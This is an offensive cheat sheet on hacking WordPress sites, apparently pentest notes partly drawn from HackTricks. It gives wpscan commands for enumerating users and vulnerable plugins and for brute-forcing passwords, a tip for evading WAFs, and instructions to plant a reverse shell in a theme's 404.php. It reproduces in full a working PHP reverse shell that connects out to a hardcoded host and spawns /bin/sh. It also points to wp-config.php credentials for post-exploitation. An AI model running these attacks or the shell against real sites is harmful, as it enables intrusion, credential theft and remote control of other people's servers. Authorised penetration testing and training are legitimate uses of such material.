## WordPress hacking

Help
```
wpscan -h
```

Basic Username Scan
```
wpscan -u <Target> -e u vp
```

| Command | Description        |
| ------- | ------------------ |
| -u      | URL                |
| -e      | Enumerate          |
| u       | UserNames          |
| vp      | Vulnerable Plugins |

Passwords
```
wpscan -u <Target> -e u --wordlist <Path To Wordlist> 
```

Assuming we got into the site as an admin we can look for ways to post a reverse shell. WP sites have an editor option which is perfect for our shells, we can modify the 404 page and add our shell, then all we need to do is visit the 404 with a listener open.

Edit Themes 404.php
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

##### PHP Reverse Shell
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```



## Cheat sheet

#### Enumerate all plugins with known vulnerabilities

`wpscan --url example.com -e vp --plugins-detection mixed --api-token YOUR_TOKEN`

#### Enumerate all plugins in our database (could take a very long time)

`wpscan --url example.com -e ap --plugins-detection mixed --api-token YOUR_TOKEN`

#### Password brute force attack

`wpscan --url example.com -e u --passwords /path/to/password_file.txt`

#### The remote website is up, but does not seem to be running WordPress

If you get the `Scan Aborted: The remote website is up, but does not seem to be running WordPress.` error, it means that for some reason WPScan did not think that the site you are trying to scan is actually WordPress. If you think WPScan is wrong, you can supply the `--force` option to force WPScan to scan the site regardless. You may also need to set other options in this case, such as `--wp-content-dir` and `--wp-plugins-dir`.

#### Redirects

By default WPScan will follow in scope redirects, unless the `--ignore-main-redirect` option is given.

To bypass some simple WAFs you can try the `--random-user-agent` option.

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress

### **Main WordPress Files**

- `index.php`
    
- `license.txt` contains useful information such as the version WordPress installed.
    
- `wp-activate.php` is used for the email activation process when setting up a new WordPress site.
    
- Login folders (may be renamed to hide it):
    
    - `/wp-admin/login.php`
        
    - `/wp-admin/wp-login.php`
        
    - `/login.php`
        
    - `/wp-login.php`
        
- `xmlrpc.php` is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
    
- The `wp-content` folder is the main directory where plugins and themes are stored.
    
- `wp-content/uploads/` Is the directory where any files uploaded to the platform are stored.
    
- `wp-includes/` This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.
    
- `wp-sitemap.xml` In Wordpress versions 5.5 and greater, Worpress generates a sitemap XML file with all public posts and publicly queryable post types and taxonomies.
    

**Post exploitation**

- The `wp-config.php` file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.
    
### Users Permissions

- **Administrator**
    
- **Editor**: Publish and manages his and others posts
    
- **Author**: Publish and manage his own posts
    
- **Contributor**: Write and manage his posts but cannot publish them
    
- **Subscriber**: Browser posts and edit their profile
    

### **Passive Enumeration**

#### **Get WordPress version**

Check if you can find the files `/license.txt` or `/readme.html`

Inside the **source code** of the page (example from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
    

```
curl https://victim.com/ | grep 'content="WordPress'
```

- `meta name`
    

![](https://book.hacktricks.xyz/~gitbook/image?url=https%3A%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-L_2uGJGU7AVNRcqRvEi%252F-ML_08ynZ86Ozx3XOFIz%252F-ML_OZveHKBK8Rgj1NiS%252Fimage.png%3Falt%3Dmedia%26token%3Db826b7e4-c69e-438b-8bdd-bd1a18713155&width=768&dpr=4&quality=100&sign=d021aa199fa150793ed0fd45f54c86d144a78bfccd80579e96112d5a6fcc7049)

- CSS link files
    

![](https://book.hacktricks.xyz/~gitbook/image?url=https%3A%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-L_2uGJGU7AVNRcqRvEi%252F-ML_08ynZ86Ozx3XOFIz%252F-ML_P36Sb7CDQF4etHYB%252Fimage.png%3Falt%3Dmedia%26token%3Dbdd159fd-b35c-4b64-8d07-13776e2fc017&width=768&dpr=4&quality=100&sign=c1466244ae052d77558b485cfc9ab578bd232a311bed9cba263054dd873a9c62)

- JavaScript files
    

![](https://book.hacktricks.xyz/~gitbook/image?url=https%3A%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-L_2uGJGU7AVNRcqRvEi%252F-ML_08ynZ86Ozx3XOFIz%252F-ML_SMRJsnNqjKckfrdu%252Fimage.png%3Falt%3Dmedia%26token%3D4c2b2a11-c401-4f7f-ace9-82bfcda3bc22&width=768&dpr=4&quality=100&sign=32c4ba7bf908a7a06c843c30beb0963b9cd7b4baf69f2389fc8bb60ef33de4ce)

### Get Plugins

```
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

### Get Themes

```
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

### Extract versions in general

```
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```